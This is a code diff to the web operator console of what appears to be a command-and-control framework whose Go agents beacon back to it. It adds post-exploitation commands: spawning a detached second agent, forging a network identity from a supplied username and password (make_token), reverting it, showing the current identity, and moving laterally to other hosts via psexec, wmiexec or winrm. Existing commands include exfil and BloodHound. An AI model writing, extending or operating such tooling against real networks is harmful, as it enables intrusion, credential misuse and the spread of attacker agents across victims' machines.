@@ -11,7 +11,7 @@ const SHELL_HISTORY_MAX = 100;
 const SHELL_DISPATCH_PREFIXES = ["cmd: ", "PS: ", "powershell: ", "pwsh: "];
 
 /** Operator meta commands — handled locally instead of being sent to the agent shell. */
-const SHELL_META_COMMANDS = ["help", "?", "exfil", "download", "screenshot", "pe", "embeddings", "bloodhound"];
+const SHELL_META_COMMANDS = ["help", "?", "exfil", "download", "screenshot", "pe", "spawn", "make_token", "rev2self", "lateral", "uid", "embeddings", "bloodhound"];
 
 const BLOODHOUND_ACTIONS = ["preflight", "create", "collect", "import", "status", "verify", "query", "queries", "report", "result", "ui", "health", "ensure", "reset", "auth", "reset_ce", "library_search", "library_get"];
 window.rmmBloodHoundActions = BLOODHOUND_ACTIONS;
@@ -2099,6 +2099,12 @@ function getShellCompletionCandidates(line) {
   if (/^\/\S*$/.test(q)) {
     return SHELL_META_COMMANDS.map(cmd => `/${cmd}`).filter(cmd => cmd.startsWith(q.toLowerCase()));
   }
+  if (/^\/lateral\s+\S*$/i.test(q)) {
+    const prefix = q.trim().split(/\s+/)[1] || "";
+    return ["psexec", "wmiexec", "winrm"]
+      .filter(method => method.startsWith(prefix.toLowerCase()))
+      .map(method => `/lateral ${method} `);
+  }
   const lower = q.toLowerCase();
   const seen = new Set();
   const cands = [];
@@ -2816,9 +2822,11 @@ function clearShellInput() {
 function parseShellWords(line, literalBackslashes = false) {
   const words = [];
   let cur = "";
+  let started = false;
   let quote = null;
   for (let i = 0; i < line.length; i += 1) {
     const c = line[i];
+    if (!/\s/.test(c) || quote) started = true;
     if (quote) {
       if (c === quote) {
         quote = null;
@@ -2834,16 +2842,17 @@ function parseShellWords(line, literalBackslashes = false) {
       continue;
     }
     if (/\s/.test(c)) {
-      if (cur) {
+      if (started) {
         words.push(cur);
         cur = "";
+        started = false;
       }
       continue;
     }
     cur += c;
   }
   if (quote && literalBackslashes) return [];
-  if (cur) words.push(cur);
+  if (started) words.push(cur);
   return words;
 }
 
@@ -3054,6 +3063,11 @@ async function dispatchShellMetaCommand(cmd, target = captureShellTarget()) {
   /embeddings run &lt;profile&gt; --document &lt;path&gt; [--document &lt;path&gt; ...]
                                    Run a saved embedding profile on this session
   /pe &lt;plugin&gt; [export] [input]     Load a Go agent plugin
+  /spawn                           Spawn a detached second Go agent from the selected Go session
+  /make_token &lt;domain\\user | user&gt; &lt;password&gt;   Create a runas /netonly style network identity
+  /rev2self                        Revert to the agent's own network identity
+  /uid                             Show the identity used by the selected Go agent
+  /lateral &lt;psexec|wmiexec|winrm&gt; &lt;host&gt;   Start a Go agent on another host
   /bloodhound ACTION [--run-id ID] [--options-json '{"key":"value"}']
                                    Operate workspace BloodHound; never sent to the agent
 
@@ -3139,6 +3153,168 @@ cmd:, PS:, powershell:, or pwsh: (including the space) to choose the agent-side 
       matchKeys: [cmd, queued],
     });
     await postPeQueue(plugin, exportName, pluginInput, target);
+    return true;
+  }
+
+  if (verb === "spawn") {
+    if (rest.length) {
+      appendShellError("Usage: /spawn (uses the selected session)");
+      return true;
+    }
+    if (!target.sessionId) {
+      appendShellError("Select a Go agent session before spawning.");
+      return true;
+    }
+    appendShellEcho(cmd);
+    if (target.isCurrent()) {
+      appendShellLine("output", "<pre>Spawning detached agent — waiting for the next beacon (this can take a few minutes)…</pre>");
+    }
+    try {
+      const { status, data } = await api(`/sessions/${encodeURIComponent(target.sessionId)}/spawn`, {
+        method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({}),
+      });
+      if (!target.isCurrent()) return true;
+      if (status !== 200) {
+        appendShellError(data?.error || `HTTP ${status}`);
+        return true;
+      }
+      appendShellLine("output", `<pre>${escapeHtml(JSON.stringify(data, null, 2))}</pre>`);
+      if (!data.registered) {
+        appendShellError("Spawn unconfirmed: the expected agent has not registered. Inspect existing evidence before retrying.");
+      } else if (!data.verified && data.verify) {
+        appendShellError("Spawn verification did not pass — inspect both sessions before relying on them.");
+      }
+      pollSessionEvents().catch(() => {});
+    } catch (error) {
+      if (target.isCurrent()) appendShellError(error.message || "Spawn request failed.");
+    }
+    return true;
+  }
+
+  if (verb === "make_token") {
+    if (rest.length !== 2) {
+      appendShellError("Usage: /make_token <domain\\user | user> <password>");
+      return true;
+    }
+    if (!target.sessionId) {
+      appendShellError("Select a Go agent session before creating a network token.");
+      return true;
+    }
+    const identity = rest[0];
+    const password = rest[1];
+    appendShellEcho(cmd);
+    try {
+      const { status, data } = await api(`/sessions/${encodeURIComponent(target.sessionId)}/make_token`, {
+        method: "POST", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ user: identity, password }),
+      });
+      if (!target.isCurrent()) return true;
+      if (status !== 200) {
+        appendShellError(data?.error || `HTTP ${status}`);
+        return true;
+      }
+      appendShellLine("output", `<pre>${escapeHtml(data.output || "")}</pre>`);
+      if (!data.ok) {
+        appendShellError("make_token failed — inspect the agent output above.");
+      }
+    } catch (error) {
+      if (target.isCurrent()) appendShellError(error.message || "make_token request failed.");
+    }
+    return true;
+  }
+
+  if (verb === "rev2self") {
+    if (rest.length) {
+      appendShellError("Usage: /rev2self");
+      return true;
+    }
+    if (!target.sessionId) {
+      appendShellError("Select a Go agent session first.");
+      return true;
+    }
+    appendShellEcho(cmd);
+    try {
+      const { status, data } = await api(`/sessions/${encodeURIComponent(target.sessionId)}/rev2self`, {
+        method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({}),
+      });
+      if (!target.isCurrent()) return true;
+      if (status !== 200) {
+        appendShellError(data?.error || `HTTP ${status}`);
+        return true;
+      }
+      appendShellLine("output", `<pre>${escapeHtml(data.output || "")}</pre>`);
+      if (!data.ok) appendShellError("rev2self failed — inspect the agent output above.");
+    } catch (error) {
+      if (target.isCurrent()) appendShellError(error.message || "rev2self request failed.");
+    }
+    return true;
+  }
+
+  if (verb === "lateral") {
+    if (rest.length !== 2) {
+      appendShellError("Usage: /lateral <psexec|wmiexec|winrm> <host>");
+      return true;
+    }
+    if (!target.sessionId) {
+      appendShellError("Select a Go agent session before moving laterally.");
+      return true;
+    }
+    const method = rest[0].toLowerCase();
+    const host = rest[1];
+    if (!["psexec", "wmiexec", "winrm"].includes(method)) {
+      appendShellError("Method must be psexec, wmiexec, or winrm.");
+      return true;
+    }
+    appendShellEcho(cmd);
+    if (target.isCurrent()) {
+      appendShellLine("output", `<pre>Lateral ${escapeHtml(method)} to ${escapeHtml(host)} — waiting for the next beacon (this can take a few minutes)…</pre>`);
+    }
+    try {
+      const { status, data } = await api(`/sessions/${encodeURIComponent(target.sessionId)}/lateral`, {
+        method: "POST", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ method, host }),
+      });
+      if (!target.isCurrent()) return true;
+      if (status !== 200) {
+        appendShellError(data?.error || `HTTP ${status}`);
+        return true;
+      }
+      appendShellLine("output", `<pre>${escapeHtml(data.output || JSON.stringify(data, null, 2))}</pre>`);
+      if (!data.registered) {
+        appendShellError("Deployment unconfirmed: the expected agent has not registered. Inspect existing evidence before retrying.");
+      } else if (data.verify && !data.verified) {
+        appendShellError("Lateral verification did not pass — inspect both sessions before relying on them.");
+      }
+      pollSessionEvents().catch(() => {});
+    } catch (error) {
+      if (target.isCurrent()) appendShellError(error.message || "Lateral request failed.");
+    }
+    return true;
+  }
+
+  if (verb === "uid") {
+    if (rest.length) {
+      appendShellError("Usage: /uid");
+      return true;
+    }
+    if (!target.sessionId) {
+      appendShellError("Select a Go agent session first.");
+      return true;
+    }
+    appendShellEcho(cmd);
+    try {
+      const { status, data } = await api(`/sessions/${encodeURIComponent(target.sessionId)}/uid`, {
+        method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify({}),
+      });
+      if (!target.isCurrent()) return true;
+      if (status !== 200) {
+        appendShellError(data?.error || `HTTP ${status}`);
+        return true;
+      }
+      appendShellLine("output", `<pre>${escapeHtml(data.output || "")}</pre>`);
+    } catch (error) {
+      if (target.isCurrent()) appendShellError(error.message || "uid request failed.");
+    }
     return true;
   }
 
